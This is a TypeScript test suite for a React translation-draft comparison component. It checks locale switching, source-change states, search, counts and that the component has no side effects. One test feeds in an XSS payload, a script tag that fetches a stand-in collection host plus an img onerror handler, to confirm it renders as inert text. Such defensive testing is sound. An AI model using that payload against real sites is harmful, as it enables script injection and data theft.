import assert from 'node:assert/strict';
import test, { after, afterEach, beforeEach } from 'node:test';
import { readFileSync } from 'node:fs';
import { registerHooks } from 'node:module';
import React from 'react';
import { act, create, type ReactTestInstance, type ReactTestRenderer } from 'react-test-renderer';
import ts from 'typescript';
import type { MassEntryReviewData, MassEntryReviewLocale, MassEntryReviewRow } from '../lib/international/locales/mass-entry-review';

const previous = new Map(['fetch', 'window', 'localStorage', 'sessionStorage', 'IS_REACT_ACT_ENVIRONMENT']
  .map(key => [key, Object.getOwnPropertyDescriptor(globalThis, key)]));
const effects = { network: 0, storage: 0, runtimeReaderImport: 0 };
const storage = () => { effects.storage++; throw Error('A comparison must not save a language, translation or approval'); };
const request = () => { effects.network++; throw Error('The native worksheet receives data rather than fetching or publishing it'); };
const browser = Object.defineProperties({}, { localStorage: { get: storage }, sessionStorage: { get: storage } });
for (const [key, descriptor] of Object.entries({ fetch: { value: request }, window: { value: browser },
  localStorage: { get: storage }, sessionStorage: { get: storage }, IS_REACT_ACT_ENVIRONMENT: { value: true } })) {
  Object.defineProperty(globalThis, key, { configurable: true, ...descriptor });
}
const root = new URL('../', import.meta.url).href;
const moduleText = (source: string) => ({ shortCircuit: true, url: 'data:text/javascript,' + encodeURIComponent(source) });
const hooks = registerHooks({
  resolve(specifier, context, next) {
    if (context.parentURL?.endsWith('/components/international/locales/MassEntryDraftReview.tsx')) {
      if (specifier === '@/lib/international/locales/mass-entry-review'
        || /mass-entry-review(?:-server|-source)?(?:\.ts)?$/.test(specifier) || specifier.startsWith('node:')) {
        effects.runtimeReaderImport++; throw Error('The browser component may import review DTO types only');
      }
      if (specifier === 'next/link') return moduleText(`import React from ${JSON.stringify(import.meta.resolve('react'))};export default function Link({children,...props}){return React.createElement('a',props,children);}`);
      if (specifier === '@/components/MenuButton') return moduleText('export default function Menu(){return null;}');
      if (specifier === '@/components/BackControl') return moduleText('export function useRegisterBackControl(){}');
    }
    return next(specifier, context);
  },
  load(url, context, next) {
    if (url.startsWith(root) && url.endsWith('.tsx')) return { shortCircuit: true, format: 'module',
      source: ts.transpileModule(readFileSync(new URL(url), 'utf8'), { compilerOptions: {
        target: ts.ScriptTarget.ES2022, module: ts.ModuleKind.ESNext, jsx: ts.JsxEmit.ReactJSX,
      } }).outputText };
    return next(url, context);
  },
});
const { default: Review } = await import('../components/international/locales/MassEntryDraftReview.tsx');
const importEffects = { ...effects };
const locales: MassEntryReviewLocale[] = ['fr', 'es', 'pt-BR', 'sw'];
const files: MassEntryReviewRow['sourceFile'][] = ['components/crops/GrowerEnteredMassField.ts',
  'components/crops/GrowerCycleIntent.ts', 'lib/release-notes.ts'];
function data(): MassEntryReviewData {
  return { sourceSha256: 'a'.repeat(64), capturedOn: '2026-11-06', issue: null,
    sources: files.map((path, index) => ({ path, status: index === 2 ? 'available' : 'matched',
      capturedSha256: index === 2 ? null : 'b'.repeat(64), currentSha256: 'b'.repeat(64) })),
    languages: locales.map(locale => ({ locale, rows: Array.from({ length: 12 }, (_, index) => ({
      key: `massEntry.synthetic.${String(index + 1).padStart(2, '0')}`,
      sourceFile: index < 5 ? files[0] : index < 11 ? files[1] : files[2],
      frozenEnglish: `Synthetic English mass wording ${index + 1}`,
      currentEnglish: `Synthetic English mass wording ${index + 1}`,
      translation: `${locale} synthetic mass draft ${index + 1}`, state: 'draft', issues: [],
    })) })),
  };
}
function text(node: ReactTestInstance | string): string {
  return typeof node === 'string' ? node : node.children.map(child => text(child as ReactTestInstance | string)).join('');
}
const mounted = new Set<ReactTestRenderer>();
function mount(input = data()) {
  let renderer!: ReactTestRenderer;
  act(() => { renderer = create(React.createElement(Review, { data: input })); }); mounted.add(renderer);
  const label = (prefix: string) => {
    const found = renderer.root.findAllByType('label').find(node => text(node).startsWith(prefix)); assert.ok(found, prefix); return found;
  };
  return { renderer, text: () => text(renderer.root),
    language: () => label('Draft language').findByType('select'),
    search: () => label('Find a key or wording').findByType('input'),
    article: (key: string) => renderer.root.findByProps({ 'aria-label': `Draft comparison for ${key}` }),
    choose(locale: string) { act(() => label('Draft language').findByType('select').props.onChange({ target: { value: locale } })); },
    find(value: string) { act(() => label('Find a key or wording').findByType('input').props.onChange({ target: { value } })); },
    update(next: MassEntryReviewData) { act(() => renderer.update(React.createElement(Review, { data: next }))); },
  };
}
beforeEach(() => { effects.network = 0; effects.storage = 0; effects.runtimeReaderImport = 0; });
afterEach(() => {
  for (const renderer of mounted) act(() => renderer.unmount()); mounted.clear();
  assert.deepEqual(effects, { network: 0, storage: 0, runtimeReaderImport: 0 });
});
after(() => {
  hooks.deregister();
  for (const [key, descriptor] of previous) {
    if (descriptor) Object.defineProperty(globalThis, key, descriptor); else Reflect.deleteProperty(globalThis, key);
  }
});

test('the actual native client compares four inactive languages with no runtime-reader import or approval action', () => {
  assert.deepEqual(importEffects, { network: 0, storage: 0, runtimeReaderImport: 0 });
  const value = data(), before = structuredClone(value), ui = mount(value);
  assert.equal(ui.language().props.value, 'fr'); assert.match(ui.language().props.className, /min-h-11/);
  const options = ui.language().findAllByType('option'); assert.deepEqual(options.map(option => option.props.value), locales);
  assert.match(text(options.find(option => option.props.value === 'pt-BR')!), /Brazilian Portuguese/);
  assert.equal(options.some(option => option.props.value === 'pt'), false);
  for (const locale of locales) {
    ui.choose(locale); assert.equal(ui.language().props.value, locale);
    const row = ui.article('massEntry.synthetic.01'), translated = row.findAllByType('p').find(node => node.props.lang === locale);
    assert.ok(translated); assert.equal(text(translated), `${locale} synthetic mass draft 1`);
    assert.equal(translated.findByType('bdi').props.dir, 'auto');
  }
  ui.choose('pt'); assert.equal(ui.language().props.value, 'sw');
  assert.match(ui.text(), /12 structurally valid drafts/); assert.match(ui.text(), /not reviewed translation (?:coverage|quality)/i);
  assert.match(ui.text(), /human approval.*not recorded|not.*human approval/i);
  assert.match(ui.text(), /no review decisions are saved|does not save.*approval/i);
  assert.deepEqual(ui.renderer.root.findAllByType('button'), [], 'this scope has no approval, save, activation or export action');
  assert.deepEqual(value, before);
});

test('source states and frozen/current differences remain visible instead of painting old wording as current', () => {
  const value = data(); value.sources[0].status = 'changed'; value.sources[1].status = 'unavailable';
  value.sources[0].currentSha256 = 'c'.repeat(64); value.sources[1].currentSha256 = null;
  for (const language of value.languages) {
    language.rows[0].currentEnglish = 'Changed actual mass wording'; language.rows[0].state = 'stale'; language.rows[0].issues = ['English source changed.'];
    language.rows[1].issues = ['Current component context changed; literal still matched.'];
    for (const row of language.rows.filter(row => row.sourceFile === files[1])) {
      row.currentEnglish = null; row.state = 'source-missing'; row.issues = ['Current English source is missing.'];
    }
  }
  const ui = mount(value), stale = ui.article('massEntry.synthetic.01'), missing = ui.article('massEntry.synthetic.06');
  assert.match(ui.text(), /changed/i); assert.match(ui.text(), /unavailable/i);
  const changedSource = ui.renderer.root.findAllByType('li').find(node => text(node).includes(files[0])); assert.ok(changedSource);
  assert.doesNotMatch(text(changedSource), /source binding unavailable/i,
    'a context warning cannot contradict independently located current literals');
  assert.match(text(stale), /Changed actual mass wording/); assert.match(text(stale), /Synthetic English mass wording 1/);
  assert.match(text(stale), /stale|changed/i); assert.match(text(stale), /English source changed/);
  assert.match(text(ui.article('massEntry.synthetic.02')), /context changed/);
  assert.match(text(missing), /Frozen English snapshot/i); assert.match(text(missing), /Synthetic English mass wording 6/);
  assert.match(text(missing), /not verified.*current|current.*unavailable/i);
  assert.equal(missing.findAllByType('h3').some(node => text(node) === 'Current English'), false);
  assert.match(ui.text(), /5 structurally valid drafts/); assert.match(ui.text(), /8 rows needing source or draft attention/);
});

test('a structurally valid draft with a source-context warning still counts as needing attention', () => {
  const value = data(); value.sources[0].status = 'changed'; value.sources[0].currentSha256 = 'c'.repeat(64);
  value.languages[0].rows[0].issues = ['Current component context changed; literal still matched.'];
  const ui = mount(value);
  assert.match(ui.text(), /12 structurally valid drafts/);
  assert.match(ui.text(), /1 rows needing source or draft attention/);
  assert.match(text(ui.article('massEntry.synthetic.01')), /context changed/);
  ui.choose('es'); assert.match(ui.text(), /0 rows needing source or draft attention/);
});

test('invalid language text remains visibly invalid without withdrawing an independent draft language', () => {
  const value = data();
  for (const row of value.languages[0].rows) {
    row.translation = null; row.state = 'invalid'; row.issues = ['The inactive draft packet is missing or damaged.'];
  }
  const ui = mount(value), row = ui.article('massEntry.synthetic.01');
  assert.match(ui.text(), /0 structurally valid drafts/); assert.match(ui.text(), /12 rows needing source or draft attention/);
  assert.match(text(row), /invalid/i); assert.match(text(row), /missing or damaged/);
  const missing = row.findAllByType('p').find(node => /No draft text|Draft unavailable/.test(text(node))); assert.ok(missing);
  assert.equal(missing.props.lang, 'en');
  ui.choose('es'); assert.match(ui.text(), /12 structurally valid drafts/);
});

test('a frozen-source failure or absent comparison shows its supplied problem without invented rows', () => {
  const value = data(); value.issue = 'The frozen English packet could not be verified.'; value.languages = [];
  value.sources = files.map(path => ({ path, status: 'unavailable', capturedSha256: null, currentSha256: null }));
  const ui = mount(value);
  assert.match(ui.text(), /frozen English packet could not be verified/);
  assert.match(ui.text(), /No draft comparison/i); assert.equal(ui.renderer.root.findAllByType('article').length, 0);
  assert.match(ui.text(), /0 structurally valid drafts/);
  ui.choose('pt-BR'); assert.equal(ui.language().props.value, 'pt-BR');
  assert.equal(ui.renderer.root.findAllByType('article').length, 0);
});

test('search matches key, actual English and selected draft text, with an explicit zero-match result and no mutation', () => {
  const value = data(); value.languages[1].rows[3].translation = 'Única etiqueta de masa';
  value.languages[0].rows[0].currentEnglish = 'Independent changed English'; value.languages[0].rows[0].state = 'stale';
  const before = structuredClone(value), ui = mount(value);
  ui.find('synthetic.09'); assert.equal(ui.renderer.root.findAllByType('article').length, 1);
  assert.match(ui.text(), /Showing 1 of 12 rows/);
  ui.find('Independent changed English'); assert.equal(ui.renderer.root.findAllByType('article').length, 1);
  ui.choose('es'); ui.find('única etiqueta'); assert.equal(ui.renderer.root.findAllByType('article').length, 1);
  assert.match(ui.text(), /Única etiqueta de masa/);
  ui.find('unmatched-synthetic-packet-word'); assert.equal(ui.renderer.root.findAllByType('article').length, 0);
  assert.match(ui.text(), /No messages match this search/); assert.match(ui.text(), /Showing 0 of 12 rows/);
  assert.equal(ui.language().props.value, 'es'); ui.find(''); assert.equal(ui.renderer.root.findAllByType('article').length, 12);
  assert.deepEqual(value, before);
});

test('a later source failure replaces earlier success while retaining a clearly labelled frozen snapshot', () => {
  const ui = mount(), changed = data(); changed.sources[0].status = 'unavailable';
  const row = changed.languages[0].rows[0]; row.currentEnglish = null; row.state = 'source-missing'; row.issues = ['Source disappeared after capture.'];
  ui.update(changed); assert.match(ui.text(), /11 structurally valid drafts/);
  const card = ui.article(row.key); assert.match(text(card), /Frozen English snapshot/i);
  assert.match(text(card), /Source disappeared after capture/); assert.match(text(card), /Synthetic English mass wording 1/);
});

test('hostile draft strings remain isolated text with no forms, save controls or executable markup', () => {
  const value = data(), payload = '<script>fetch("https://invalid.example/collect")</script><img src=x onerror="alert(1)">';
  value.languages[0].rows[0].translation = payload;
  const before = structuredClone(value), ui = mount(value), row = ui.article('massEntry.synthetic.01');
  const draft = row.findAllByType('p').find(node => node.props.lang === 'fr'); assert.ok(draft);
  assert.deepEqual(draft.findByType('bdi').children, [payload]);
  for (const tag of ['script', 'img', 'iframe', 'form', 'button'] as const) assert.equal(ui.renderer.root.findAllByType(tag).length, 0, tag);
  assert.equal(ui.renderer.root.findAll(node => Object.hasOwn(node.props, 'dangerouslySetInnerHTML')).length, 0);
  assert.equal(ui.renderer.root.findAllByType('select').length, 1); assert.equal(ui.renderer.root.findAllByType('input').length, 1);
  assert.equal(ui.search().props.type, 'search');
  for (const link of ui.renderer.root.findAllByType('a')) {
    assert.equal(link.props.href, '/international/locales'); assert.equal(link.props.prefetch, false);
    assert.match(link.props.className, /min-h-11/);
  }
  assert.deepEqual(value, before);
});
